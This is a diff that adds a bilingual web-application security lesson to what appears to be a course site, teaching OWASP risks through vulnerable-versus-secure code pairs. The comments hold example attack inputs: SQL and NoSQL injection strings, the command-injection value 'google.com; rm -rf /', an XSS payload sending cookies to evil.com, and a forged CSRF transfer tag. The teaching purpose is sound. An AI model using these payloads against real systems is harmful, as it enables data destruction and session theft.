@@ -28,6 +28,9 @@ const sections = [
   { slug: 'redis', titleEs: 'Redis & Cache', titleEn: 'Redis & Cache', level: 'chef', icon: '⚡' },
   { slug: 'docker-compose', titleEs: 'Docker Compose', titleEn: 'Docker Compose', level: 'chef', icon: '🐳' },
   { slug: 'cicd', titleEs: 'CI/CD', titleEn: 'CI/CD', level: 'chef', icon: '🚀' },
+  { slug: 'testing', titleEs: 'Testing Profesional', titleEn: 'Professional Testing', level: 'chef', icon: '🧪' },
+  { slug: 'security', titleEs: 'Seguridad de Aplicaciones', titleEn: 'Application Security', level: 'chef', icon: '🛡️' },
+  { slug: 'observability', titleEs: 'Observabilidad', titleEn: 'Observability', level: 'chef', icon: '📊' },
   { slug: 'mobile', titleEs: 'React Native & Expo', titleEn: 'React Native & Expo', level: 'chef', icon: '📱' },
   { slug: 'iot', titleEs: 'IoT & Arduino', titleEn: 'IoT & Arduino', level: 'chef', icon: '🔌' },
   { slug: 'vector-db', titleEs: 'Bases de Datos Vectoriales', titleEn: 'Vector Databases', level: 'master', icon: '🗄️' },
@@ -10941,6 +10944,3007 @@ IMPORTANT: If there's ANY doubt about authenticity, set requiresManualReview: tr
 → [Multimodal App](/en/cooking/multimodal-app)
     `,
   },
+
+  'security': {
+    contentEs: `
+## La seguridad no es opcional
+
+Imagina que construyes una casa hermosa pero dejas todas las puertas y ventanas abiertas. No importa que tan bonita sea, cualquiera puede entrar y llevarse todo. La seguridad en aplicaciones web funciona exactamente igual.
+
+> **La diferencia entre un desarrollador junior y uno senior no es solo escribir codigo que funciona, sino codigo que no puede ser explotado.**
+
+---
+
+## OWASP Top 10: Las vulnerabilidades mas criticas
+
+OWASP (Open Web Application Security Project) mantiene una lista de las 10 vulnerabilidades mas peligrosas. Conocerlas es el primer paso para proteger tu aplicacion.
+
+| # | Vulnerabilidad | Analogia |
+|---|----------------|----------|
+| 1 | **Broken Access Control** | Dar llaves maestras a todos |
+| 2 | **Cryptographic Failures** | Guardar contrasenas en post-its |
+| 3 | **Injection** | Aceptar cualquier paquete sin revisar |
+| 4 | **Insecure Design** | Casa sin cerraduras desde el plano |
+| 5 | **Security Misconfiguration** | Dejar la puerta trasera abierta |
+| 6 | **Vulnerable Components** | Usar materiales defectuosos |
+| 7 | **Auth Failures** | Portero que deja pasar a todos |
+| 8 | **Software/Data Integrity** | No verificar quien modifico algo |
+| 9 | **Logging Failures** | No tener camaras de seguridad |
+| 10 | **SSRF** | Dejar que extranos usen tu telefono |
+
+---
+
+## Ataques de Inyeccion
+
+Los ataques de inyeccion ocurren cuando datos no confiables se envian a un interprete como parte de un comando o consulta.
+
+### SQL Injection
+
+**Analogia**: Es como si alguien te preguntara su nombre para registrarlo, y en vez de decir "Juan", dijera "Juan; BORRAR TODO EL REGISTRO".
+
+\`\`\`javascript
+// VULNERABLE - Nunca hagas esto
+const query = \`SELECT * FROM users WHERE id = \${userId}\`;
+
+// Atacante envia: userId = "1 OR 1=1; DROP TABLE users;--"
+// Resultado: Se ejecuta codigo malicioso
+\`\`\`
+
+\`\`\`javascript
+// SEGURO - Usa consultas parametrizadas
+const query = 'SELECT * FROM users WHERE id = $1';
+const result = await pool.query(query, [userId]);
+
+// Con ORMs como Prisma (recomendado)
+const user = await prisma.user.findUnique({
+  where: { id: parseInt(userId) }
+});
+\`\`\`
+
+### NoSQL Injection
+
+\`\`\`javascript
+// VULNERABLE
+const user = await User.findOne({
+  username: req.body.username,
+  password: req.body.password
+});
+
+// Atacante envia: { "username": "admin", "password": { "$gt": "" } }
+// Esto encuentra cualquier usuario con password mayor a string vacio!
+\`\`\`
+
+\`\`\`javascript
+// SEGURO - Valida y sanitiza inputs
+import { z } from 'zod';
+
+const loginSchema = z.object({
+  username: z.string().min(3).max(50),
+  password: z.string().min(8)
+});
+
+const { username, password } = loginSchema.parse(req.body);
+const user = await User.findOne({ username, password: hashPassword(password) });
+\`\`\`
+
+### Command Injection
+
+\`\`\`javascript
+// VULNERABLE
+const { exec } = require('child_process');
+exec(\`ping \${userInput}\`, callback);
+
+// Atacante envia: "google.com; rm -rf /"
+// Resultado: Borra todo el servidor!
+\`\`\`
+
+\`\`\`javascript
+// SEGURO - Usa execFile con argumentos separados
+const { execFile } = require('child_process');
+execFile('ping', ['-c', '4', sanitizedHost], callback);
+
+// O mejor, usa librerias especificas
+import ping from 'ping';
+const result = await ping.promise.probe(sanitizedHost);
+\`\`\`
+
+---
+
+## XSS (Cross-Site Scripting)
+
+XSS permite a atacantes inyectar scripts maliciosos en paginas web vistas por otros usuarios.
+
+**Analogia**: Es como si alguien pudiera pegar stickers falsos en tu tienda que enganan a tus clientes.
+
+### Tipos de XSS
+
+| Tipo | Descripcion | Ejemplo |
+|------|-------------|---------|
+| **Stored** | Script guardado en DB | Comentario con \`<script>\` |
+| **Reflected** | Script en URL | Link malicioso por email |
+| **DOM-based** | Manipulacion del DOM | \`document.write(location.hash)\` |
+
+### Ejemplos vulnerables vs seguros
+
+\`\`\`javascript
+// VULNERABLE - React con dangerouslySetInnerHTML
+function Comment({ text }) {
+  return <div dangerouslySetInnerHTML={{ __html: text }} />;
+}
+
+// Atacante guarda: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
+\`\`\`
+
+\`\`\`javascript
+// SEGURO - React escapa automaticamente
+function Comment({ text }) {
+  return <div>{text}</div>; // Los tags se muestran como texto
+}
+
+// Si necesitas HTML, usa DOMPurify
+import DOMPurify from 'dompurify';
+
+function Comment({ text }) {
+  const clean = DOMPurify.sanitize(text);
+  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
+}
+\`\`\`
+
+\`\`\`javascript
+// VULNERABLE - Template literals en HTML
+app.get('/search', (req, res) => {
+  res.send(\`<h1>Resultados para: \${req.query.q}</h1>\`);
+});
+
+// Atacante visita: /search?q=<script>alert('XSS')</script>
+\`\`\`
+
+\`\`\`javascript
+// SEGURO - Escapa el output
+import escapeHtml from 'escape-html';
+
+app.get('/search', (req, res) => {
+  res.send(\`<h1>Resultados para: \${escapeHtml(req.query.q)}</h1>\`);
+});
+\`\`\`
+
+---
+
+## CSRF (Cross-Site Request Forgery)
+
+CSRF engana a usuarios autenticados para ejecutar acciones no deseadas.
+
+**Analogia**: Alguien falsifica tu firma en un documento mientras estas distraido.
+
+\`\`\`html
+<!-- Sitio malicioso evil.com -->
+<img src="https://tubank.com/transfer?to=hacker&amount=10000" />
+<!-- El navegador envia las cookies automaticamente! -->
+\`\`\`
+
+### Proteccion con tokens CSRF
+
+\`\`\`javascript
+// Backend - Generar token
+import csrf from 'csurf';
+const csrfProtection = csrf({ cookie: true });
+
+app.get('/form', csrfProtection, (req, res) => {
+  res.render('form', { csrfToken: req.csrfToken() });
+});
+
+app.post('/transfer', csrfProtection, (req, res) => {
+  // El middleware valida el token automaticamente
+  processTransfer(req.body);
+});
+\`\`\`
+
+\`\`\`html
+<!-- Frontend - Incluir token en formularios -->
+<form action="/transfer" method="POST">
+  <input type="hidden" name="_csrf" value="{{csrfToken}}" />
+  <input type="text" name="amount" />
+  <button type="submit">Transferir</button>
+</form>
+\`\`\`
+
+### SameSite Cookies (Defensa moderna)
+
+\`\`\`javascript
+// Configurar cookies con SameSite
+res.cookie('session', sessionId, {
+  httpOnly: true,      // No accesible desde JavaScript
+  secure: true,        // Solo HTTPS
+  sameSite: 'strict',  // No se envia en requests cross-site
+  maxAge: 3600000      // 1 hora
+});
+\`\`\`
+
+---
+
+## Autenticacion y Sesiones Seguras
+
+### Almacenamiento de contrasenas
+
+\`\`\`javascript
+// NUNCA - Texto plano
+const user = { password: 'miPassword123' }; // NUNCA!
+
+// NUNCA - Hashing debil
+const hash = crypto.createHash('md5').update(password).digest('hex');
+
+// SIEMPRE - bcrypt con salt
+import bcrypt from 'bcrypt';
+
+// Al registrar
+const saltRounds = 12;
+const hashedPassword = await bcrypt.hash(password, saltRounds);
+
+// Al login
+const isValid = await bcrypt.compare(inputPassword, hashedPassword);
+\`\`\`
+
+### JWT seguro
+
+\`\`\`javascript
+import jwt from 'jsonwebtoken';
+
+// Generar token
+const token = jwt.sign(
+  { userId: user.id, role: user.role },
+  process.env.JWT_SECRET,
+  {
+    expiresIn: '1h',
+    algorithm: 'HS256'
+  }
+);
+
+// Verificar token
+try {
+  const decoded = jwt.verify(token, process.env.JWT_SECRET);
+} catch (error) {
+  // Token invalido o expirado
+}
+\`\`\`
+
+### Sesiones seguras con Redis
+
+\`\`\`javascript
+import session from 'express-session';
+import RedisStore from 'connect-redis';
+import { createClient } from 'redis';
+
+const redisClient = createClient();
+
+app.use(session({
+  store: new RedisStore({ client: redisClient }),
+  secret: process.env.SESSION_SECRET,
+  resave: false,
+  saveUninitialized: false,
+  cookie: {
+    secure: true,
+    httpOnly: true,
+    maxAge: 1000 * 60 * 60 * 24 // 1 dia
+  }
+}));
+\`\`\`
+
+---
+
+## Exposicion de Datos Sensibles
+
+### Que NUNCA debe estar en tu codigo
+
+\`\`\`javascript
+// NUNCA en el codigo
+const API_KEY = 'sk-1234567890abcdef'; // NUNCA!
+const DB_PASSWORD = 'superSecretPassword'; // NUNCA!
+
+// SIEMPRE en variables de entorno
+const API_KEY = process.env.API_KEY;
+const DB_PASSWORD = process.env.DB_PASSWORD;
+\`\`\`
+
+### .env y .gitignore
+
+\`\`\`bash
+# .env (NUNCA en Git)
+DATABASE_URL=postgresql://user:pass@localhost:5432/db
+JWT_SECRET=tu-secreto-muy-largo-y-aleatorio
+API_KEY=sk-produccion-key
+\`\`\`
+
+\`\`\`bash
+# .gitignore
+.env
+.env.local
+.env.*.local
+*.pem
+*.key
+\`\`\`
+
+### Encriptacion de datos sensibles
+
+\`\`\`javascript
+import crypto from 'crypto';
+
+const algorithm = 'aes-256-gcm';
+const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
+
+function encrypt(text) {
+  const iv = crypto.randomBytes(16);
+  const cipher = crypto.createCipheriv(algorithm, key, iv);
+
+  let encrypted = cipher.update(text, 'utf8', 'hex');
+  encrypted += cipher.final('hex');
+
+  const authTag = cipher.getAuthTag();
+
+  return {
+    iv: iv.toString('hex'),
+    encrypted,
+    authTag: authTag.toString('hex')
+  };
+}
+
+function decrypt({ iv, encrypted, authTag }) {
+  const decipher = crypto.createDecipheriv(
+    algorithm,
+    key,
+    Buffer.from(iv, 'hex')
+  );
+  decipher.setAuthTag(Buffer.from(authTag, 'hex'));
+
+  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
+  decrypted += decipher.final('utf8');
+
+  return decrypted;
+}
+\`\`\`
+
+---
+
+## Security Headers
+
+Los headers HTTP son tu primera linea de defensa.
+
+### Configuracion con Helmet (Express)
+
+\`\`\`javascript
+import helmet from 'helmet';
+
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'", "'unsafe-inline'"],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      imgSrc: ["'self'", "data:", "https:"],
+      connectSrc: ["'self'", "https://api.tudominio.com"]
+    }
+  },
+  hsts: {
+    maxAge: 31536000,
+    includeSubDomains: true,
+    preload: true
+  }
+}));
+\`\`\`
+
+### Headers en Next.js
+
+\`\`\`javascript
+// next.config.js
+const securityHeaders = [
+  {
+    key: 'X-DNS-Prefetch-Control',
+    value: 'on'
+  },
+  {
+    key: 'Strict-Transport-Security',
+    value: 'max-age=63072000; includeSubDomains; preload'
+  },
+  {
+    key: 'X-Frame-Options',
+    value: 'SAMEORIGIN'
+  },
+  {
+    key: 'X-Content-Type-Options',
+    value: 'nosniff'
+  },
+  {
+    key: 'Referrer-Policy',
+    value: 'origin-when-cross-origin'
+  },
+  {
+    key: 'Content-Security-Policy',
+    value: "default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline';"
+  }
+];
+
+module.exports = {
+  async headers() {
+    return [
+      {
+        source: '/:path*',
+        headers: securityHeaders
+      }
+    ];
+  }
+};
+\`\`\`
+
+### Principales headers explicados
+
+| Header | Funcion |
+|--------|---------|
+| **CSP** | Controla que recursos puede cargar la pagina |
+| **HSTS** | Fuerza HTTPS en el navegador |
+| **X-Frame-Options** | Previene clickjacking |
+| **X-Content-Type-Options** | Previene MIME sniffing |
+| **CORS** | Controla requests cross-origin |
+
+---
+
+## Validacion y Sanitizacion
+
+### Zod para validacion de schemas
+
+\`\`\`javascript
+import { z } from 'zod';
+
+// Definir schema
+const userSchema = z.object({
+  email: z.string().email(),
+  password: z.string().min(8).regex(/[A-Z]/).regex(/[0-9]/),
+  age: z.number().min(18).max(120).optional(),
+  role: z.enum(['user', 'admin']).default('user')
+});
+
+// Validar en endpoint
+app.post('/register', async (req, res) => {
+  try {
+    const validData = userSchema.parse(req.body);
+    // Datos seguros para usar
+    await createUser(validData);
+  } catch (error) {
+    if (error instanceof z.ZodError) {
+      return res.status(400).json({ errors: error.errors });
+    }
+  }
+});
+\`\`\`
+
+### Sanitizacion de HTML
+
+\`\`\`javascript
+import createDOMPurify from 'dompurify';
+import { JSDOM } from 'jsdom';
+
+const window = new JSDOM('').window;
+const DOMPurify = createDOMPurify(window);
+
+// Configuracion estricta
+const clean = DOMPurify.sanitize(dirtyHtml, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
+  ALLOWED_ATTR: ['href', 'title'],
+  ALLOW_DATA_ATTR: false
+});
+\`\`\`
+
+---
+
+## Seguridad de Dependencias
+
+### npm audit
+
+\`\`\`bash
+# Revisar vulnerabilidades
+npm audit
+
+# Arreglar automaticamente
+npm audit fix
+
+# Ver detalle de vulnerabilidades criticas
+npm audit --audit-level=critical
+\`\`\`
+
+### Snyk (Recomendado)
+
+\`\`\`bash
+# Instalar
+npm install -g snyk
+
+# Autenticar
+snyk auth
+
+# Escanear proyecto
+snyk test
+
+# Monitorear continuamente
+snyk monitor
+\`\`\`
+
+### Dependabot en GitHub
+
+\`\`\`yaml
+# .github/dependabot.yml
+version: 2
+updates:
+  - package-ecosystem: "npm"
+    directory: "/"
+    schedule:
+      interval: "weekly"
+    open-pull-requests-limit: 10
+\`\`\`
+
+---
+
+## Herramientas de Testing de Seguridad
+
+| Herramienta | Tipo | Uso |
+|-------------|------|-----|
+| **OWASP ZAP** | DAST | Escaneo automatico de web |
+| **Burp Suite** | Proxy | Testing manual avanzado |
+| **SonarQube** | SAST | Analisis estatico de codigo |
+| **Snyk** | SCA | Dependencias vulnerables |
+| **npm audit** | SCA | Dependencias npm |
+| **ESLint Security** | SAST | Reglas de seguridad JS |
+
+### ESLint con reglas de seguridad
+
+\`\`\`javascript
+// .eslintrc.js
+module.exports = {
+  plugins: ['security'],
+  extends: ['plugin:security/recommended'],
+  rules: {
+    'security/detect-object-injection': 'error',
+    'security/detect-non-literal-regexp': 'error',
+    'security/detect-unsafe-regex': 'error',
+    'security/detect-buffer-noassert': 'error',
+    'security/detect-eval-with-expression': 'error',
+    'security/detect-no-csrf-before-method-override': 'error'
+  }
+};
+\`\`\`
+
+---
+
+## Checklist de seguridad
+
+- [ ] Validar y sanitizar TODOS los inputs
+- [ ] Usar consultas parametrizadas (no concatenar SQL)
+- [ ] Hashear contrasenas con bcrypt (saltRounds >= 12)
+- [ ] Implementar CSRF tokens o SameSite cookies
+- [ ] Configurar security headers (CSP, HSTS, etc.)
+- [ ] Mantener dependencias actualizadas
+- [ ] No exponer secretos en codigo o logs
+- [ ] Usar HTTPS en produccion
+- [ ] Implementar rate limiting
+- [ ] Logging de eventos de seguridad
+
+---
+
+## Practica
+
+-> [Auditoria de Seguridad](/es/cooking/security-audit) - Analiza y corrige vulnerabilidades en una app
+
+---
+
+## Enlaces utiles
+
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
+- [Snyk Learn](https://learn.snyk.io/)
+- [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)
+    `,
+    contentEn: `
+## Security is not optional
+
+Imagine building a beautiful house but leaving all doors and windows open. No matter how pretty it is, anyone can enter and take everything. Web application security works exactly the same way.
+
+> **The difference between a junior and senior developer is not just writing code that works, but code that cannot be exploited.**
+
+---
+
+## OWASP Top 10: The most critical vulnerabilities
+
+OWASP (Open Web Application Security Project) maintains a list of the 10 most dangerous vulnerabilities. Knowing them is the first step to protecting your application.
+
+| # | Vulnerability | Analogy |
+|---|---------------|---------|
+| 1 | **Broken Access Control** | Giving master keys to everyone |
+| 2 | **Cryptographic Failures** | Storing passwords on post-its |
+| 3 | **Injection** | Accepting any package without checking |
+| 4 | **Insecure Design** | House without locks from the blueprint |
+| 5 | **Security Misconfiguration** | Leaving the back door open |
+| 6 | **Vulnerable Components** | Using defective materials |
+| 7 | **Auth Failures** | Doorman who lets everyone in |
+| 8 | **Software/Data Integrity** | Not verifying who modified something |
+| 9 | **Logging Failures** | Not having security cameras |
+| 10 | **SSRF** | Letting strangers use your phone |
+
+---
+
+## Injection Attacks
+
+Injection attacks occur when untrusted data is sent to an interpreter as part of a command or query.
+
+### SQL Injection
+
+**Analogy**: It is like if someone asked for their name to register, and instead of saying "John", they said "John; DELETE ALL RECORDS".
+
+\`\`\`javascript
+// VULNERABLE - Never do this
+const query = \`SELECT * FROM users WHERE id = \${userId}\`;
+
+// Attacker sends: userId = "1 OR 1=1; DROP TABLE users;--"
+// Result: Malicious code executes
+\`\`\`
+
+\`\`\`javascript
+// SECURE - Use parameterized queries
+const query = 'SELECT * FROM users WHERE id = $1';
+const result = await pool.query(query, [userId]);
+
+// With ORMs like Prisma (recommended)
+const user = await prisma.user.findUnique({
+  where: { id: parseInt(userId) }
+});
+\`\`\`
+
+### NoSQL Injection
+
+\`\`\`javascript
+// VULNERABLE
+const user = await User.findOne({
+  username: req.body.username,
+  password: req.body.password
+});
+
+// Attacker sends: { "username": "admin", "password": { "$gt": "" } }
+// This finds any user with password greater than empty string!
+\`\`\`
+
+\`\`\`javascript
+// SECURE - Validate and sanitize inputs
+import { z } from 'zod';
+
+const loginSchema = z.object({
+  username: z.string().min(3).max(50),
+  password: z.string().min(8)
+});
+
+const { username, password } = loginSchema.parse(req.body);
+const user = await User.findOne({ username, password: hashPassword(password) });
+\`\`\`
+
+### Command Injection
+
+\`\`\`javascript
+// VULNERABLE
+const { exec } = require('child_process');
+exec(\`ping \${userInput}\`, callback);
+
+// Attacker sends: "google.com; rm -rf /"
+// Result: Deletes entire server!
+\`\`\`
+
+\`\`\`javascript
+// SECURE - Use execFile with separate arguments
+const { execFile } = require('child_process');
+execFile('ping', ['-c', '4', sanitizedHost], callback);
+
+// Or better, use specific libraries
+import ping from 'ping';
+const result = await ping.promise.probe(sanitizedHost);
+\`\`\`
+
+---
+
+## XSS (Cross-Site Scripting)
+
+XSS allows attackers to inject malicious scripts into web pages viewed by other users.
+
+**Analogy**: It is like someone being able to put fake stickers in your store that deceive your customers.
+
+### Types of XSS
+
+| Type | Description | Example |
+|------|-------------|---------|
+| **Stored** | Script saved in DB | Comment with \`<script>\` |
+| **Reflected** | Script in URL | Malicious link via email |
+| **DOM-based** | DOM manipulation | \`document.write(location.hash)\` |
+
+### Vulnerable vs secure examples
+
+\`\`\`javascript
+// VULNERABLE - React with dangerouslySetInnerHTML
+function Comment({ text }) {
+  return <div dangerouslySetInnerHTML={{ __html: text }} />;
+}
+
+// Attacker saves: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
+\`\`\`
+
+\`\`\`javascript
+// SECURE - React escapes automatically
+function Comment({ text }) {
+  return <div>{text}</div>; // Tags are displayed as text
+}
+
+// If you need HTML, use DOMPurify
+import DOMPurify from 'dompurify';
+
+function Comment({ text }) {
+  const clean = DOMPurify.sanitize(text);
+  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
+}
+\`\`\`
+
+\`\`\`javascript
+// VULNERABLE - Template literals in HTML
+app.get('/search', (req, res) => {
+  res.send(\`<h1>Results for: \${req.query.q}</h1>\`);
+});
+
+// Attacker visits: /search?q=<script>alert('XSS')</script>
+\`\`\`
+
+\`\`\`javascript
+// SECURE - Escape the output
+import escapeHtml from 'escape-html';
+
+app.get('/search', (req, res) => {
+  res.send(\`<h1>Results for: \${escapeHtml(req.query.q)}</h1>\`);
+});
+\`\`\`
+
+---
+
+## CSRF (Cross-Site Request Forgery)
+
+CSRF tricks authenticated users into executing unwanted actions.
+
+**Analogy**: Someone forges your signature on a document while you are distracted.
+
+\`\`\`html
+<!-- Malicious site evil.com -->
+<img src="https://yourbank.com/transfer?to=hacker&amount=10000" />
+<!-- The browser sends cookies automatically! -->
+\`\`\`
+
+### Protection with CSRF tokens
+
+\`\`\`javascript
+// Backend - Generate token
+import csrf from 'csurf';
+const csrfProtection = csrf({ cookie: true });
+
+app.get('/form', csrfProtection, (req, res) => {
+  res.render('form', { csrfToken: req.csrfToken() });
+});
+
+app.post('/transfer', csrfProtection, (req, res) => {
+  // Middleware validates token automatically
+  processTransfer(req.body);
+});
+\`\`\`
+
+\`\`\`html
+<!-- Frontend - Include token in forms -->
+<form action="/transfer" method="POST">
+  <input type="hidden" name="_csrf" value="{{csrfToken}}" />
+  <input type="text" name="amount" />
+  <button type="submit">Transfer</button>
+</form>
+\`\`\`
+
+### SameSite Cookies (Modern defense)
+
+\`\`\`javascript
+// Configure cookies with SameSite
+res.cookie('session', sessionId, {
+  httpOnly: true,      // Not accessible from JavaScript
+  secure: true,        // HTTPS only
+  sameSite: 'strict',  // Not sent in cross-site requests
+  maxAge: 3600000      // 1 hour
+});
+\`\`\`
+
+---
+
+## Secure Authentication and Sessions
+
+### Password storage
+
+\`\`\`javascript
+// NEVER - Plain text
+const user = { password: 'myPassword123' }; // NEVER!
+
+// NEVER - Weak hashing
+const hash = crypto.createHash('md5').update(password).digest('hex');
+
+// ALWAYS - bcrypt with salt
+import bcrypt from 'bcrypt';
+
+// When registering
+const saltRounds = 12;
+const hashedPassword = await bcrypt.hash(password, saltRounds);
+
+// When logging in
+const isValid = await bcrypt.compare(inputPassword, hashedPassword);
+\`\`\`
+
+### Secure JWT
+
+\`\`\`javascript
+import jwt from 'jsonwebtoken';
+
+// Generate token
+const token = jwt.sign(
+  { userId: user.id, role: user.role },
+  process.env.JWT_SECRET,
+  {
+    expiresIn: '1h',
+    algorithm: 'HS256'
+  }
+);
+
+// Verify token
+try {
+  const decoded = jwt.verify(token, process.env.JWT_SECRET);
+} catch (error) {
+  // Invalid or expired token
+}
+\`\`\`
+
+### Secure sessions with Redis
+
+\`\`\`javascript
+import session from 'express-session';
+import RedisStore from 'connect-redis';
+import { createClient } from 'redis';
+
+const redisClient = createClient();
+
+app.use(session({
+  store: new RedisStore({ client: redisClient }),
+  secret: process.env.SESSION_SECRET,
+  resave: false,
+  saveUninitialized: false,
+  cookie: {
+    secure: true,
+    httpOnly: true,
+    maxAge: 1000 * 60 * 60 * 24 // 1 day
+  }
+}));
+\`\`\`
+
+---
+
+## Sensitive Data Exposure
+
+### What should NEVER be in your code
+
+\`\`\`javascript
+// NEVER in code
+const API_KEY = 'sk-1234567890abcdef'; // NEVER!
+const DB_PASSWORD = 'superSecretPassword'; // NEVER!
+
+// ALWAYS in environment variables
+const API_KEY = process.env.API_KEY;
+const DB_PASSWORD = process.env.DB_PASSWORD;
+\`\`\`
+
+### .env and .gitignore
+
+\`\`\`bash
+# .env (NEVER in Git)
+DATABASE_URL=postgresql://user:pass@localhost:5432/db
+JWT_SECRET=your-very-long-random-secret
+API_KEY=sk-production-key
+\`\`\`
+
+\`\`\`bash
+# .gitignore
+.env
+.env.local
+.env.*.local
+*.pem
+*.key
+\`\`\`
+
+### Encrypting sensitive data
+
+\`\`\`javascript
+import crypto from 'crypto';
+
+const algorithm = 'aes-256-gcm';
+const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
+
+function encrypt(text) {
+  const iv = crypto.randomBytes(16);
+  const cipher = crypto.createCipheriv(algorithm, key, iv);
+
+  let encrypted = cipher.update(text, 'utf8', 'hex');
+  encrypted += cipher.final('hex');
+
+  const authTag = cipher.getAuthTag();
+
+  return {
+    iv: iv.toString('hex'),
+    encrypted,
+    authTag: authTag.toString('hex')
+  };
+}
+
+function decrypt({ iv, encrypted, authTag }) {
+  const decipher = crypto.createDecipheriv(
+    algorithm,
+    key,
+    Buffer.from(iv, 'hex')
+  );
+  decipher.setAuthTag(Buffer.from(authTag, 'hex'));
+
+  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
+  decrypted += decipher.final('utf8');
+
+  return decrypted;
+}
+\`\`\`
+
+---
+
+## Security Headers
+
+HTTP headers are your first line of defense.
+
+### Configuration with Helmet (Express)
+
+\`\`\`javascript
+import helmet from 'helmet';
+
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'", "'unsafe-inline'"],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      imgSrc: ["'self'", "data:", "https:"],
+      connectSrc: ["'self'", "https://api.yourdomain.com"]
+    }
+  },
+  hsts: {
+    maxAge: 31536000,
+    includeSubDomains: true,
+    preload: true
+  }
+}));
+\`\`\`
+
+### Headers in Next.js
+
+\`\`\`javascript
+// next.config.js
+const securityHeaders = [
+  {
+    key: 'X-DNS-Prefetch-Control',
+    value: 'on'
+  },
+  {
+    key: 'Strict-Transport-Security',
+    value: 'max-age=63072000; includeSubDomains; preload'
+  },
+  {
+    key: 'X-Frame-Options',
+    value: 'SAMEORIGIN'
+  },
+  {
+    key: 'X-Content-Type-Options',
+    value: 'nosniff'
+  },
+  {
+    key: 'Referrer-Policy',
+    value: 'origin-when-cross-origin'
+  },
+  {
+    key: 'Content-Security-Policy',
+    value: "default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline';"
+  }
+];
+
+module.exports = {
+  async headers() {
+    return [
+      {
+        source: '/:path*',
+        headers: securityHeaders
+      }
+    ];
+  }
+};
+\`\`\`
+
+### Main headers explained
+
+| Header | Function |
+|--------|----------|
+| **CSP** | Controls what resources the page can load |
+| **HSTS** | Forces HTTPS in the browser |
+| **X-Frame-Options** | Prevents clickjacking |
+| **X-Content-Type-Options** | Prevents MIME sniffing |
+| **CORS** | Controls cross-origin requests |
+
+---
+
+## Validation and Sanitization
+
+### Zod for schema validation
+
+\`\`\`javascript
+import { z } from 'zod';
+
+// Define schema
+const userSchema = z.object({
+  email: z.string().email(),
+  password: z.string().min(8).regex(/[A-Z]/).regex(/[0-9]/),
+  age: z.number().min(18).max(120).optional(),
+  role: z.enum(['user', 'admin']).default('user')
+});
+
+// Validate in endpoint
+app.post('/register', async (req, res) => {
+  try {
+    const validData = userSchema.parse(req.body);
+    // Safe data to use
+    await createUser(validData);
+  } catch (error) {
+    if (error instanceof z.ZodError) {
+      return res.status(400).json({ errors: error.errors });
+    }
+  }
+});
+\`\`\`
+
+### HTML sanitization
+
+\`\`\`javascript
+import createDOMPurify from 'dompurify';
+import { JSDOM } from 'jsdom';
+
+const window = new JSDOM('').window;
+const DOMPurify = createDOMPurify(window);
+
+// Strict configuration
+const clean = DOMPurify.sanitize(dirtyHtml, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
+  ALLOWED_ATTR: ['href', 'title'],
+  ALLOW_DATA_ATTR: false
+});
+\`\`\`
+
+---
+
+## Dependency Security
+
+### npm audit
+
+\`\`\`bash
+# Check vulnerabilities
+npm audit
+
+# Fix automatically
+npm audit fix
+
+# See details of critical vulnerabilities
+npm audit --audit-level=critical
+\`\`\`
+
+### Snyk (Recommended)
+
+\`\`\`bash
+# Install
+npm install -g snyk
+
+# Authenticate
+snyk auth
+
+# Scan project
+snyk test
+
+# Monitor continuously
+snyk monitor
+\`\`\`
+
+### Dependabot on GitHub
+
+\`\`\`yaml
+# .github/dependabot.yml
+version: 2
+updates:
+  - package-ecosystem: "npm"
+    directory: "/"
+    schedule:
+      interval: "weekly"
+    open-pull-requests-limit: 10
+\`\`\`
+
+---
+
+## Security Testing Tools
+
+| Tool | Type | Use |
+|------|------|-----|
+| **OWASP ZAP** | DAST | Automated web scanning |
+| **Burp Suite** | Proxy | Advanced manual testing |
+| **SonarQube** | SAST | Static code analysis |
+| **Snyk** | SCA | Vulnerable dependencies |
+| **npm audit** | SCA | npm dependencies |
+| **ESLint Security** | SAST | JS security rules |
+
+### ESLint with security rules
+
+\`\`\`javascript
+// .eslintrc.js
+module.exports = {
+  plugins: ['security'],
+  extends: ['plugin:security/recommended'],
+  rules: {
+    'security/detect-object-injection': 'error',
+    'security/detect-non-literal-regexp': 'error',
+    'security/detect-unsafe-regex': 'error',
+    'security/detect-buffer-noassert': 'error',
+    'security/detect-eval-with-expression': 'error',
+    'security/detect-no-csrf-before-method-override': 'error'
+  }
+};
+\`\`\`
+
+---
+
+## Security checklist
+
+- [ ] Validate and sanitize ALL inputs
+- [ ] Use parameterized queries (do not concatenate SQL)
+- [ ] Hash passwords with bcrypt (saltRounds >= 12)
+- [ ] Implement CSRF tokens or SameSite cookies
+- [ ] Configure security headers (CSP, HSTS, etc.)
+- [ ] Keep dependencies updated
+- [ ] Do not expose secrets in code or logs
+- [ ] Use HTTPS in production
+- [ ] Implement rate limiting
+- [ ] Log security events
+
+---
+
+## Practice
+
+-> [Security Audit](/en/cooking/security-audit) - Analyze and fix vulnerabilities in an app
+
+---
+
+## Useful links
+
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
+- [Snyk Learn](https://learn.snyk.io/)
+- [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)
+    `,
+  },
+
+  'observability': {
+    contentEs: `
+## El problema de la caja negra
+
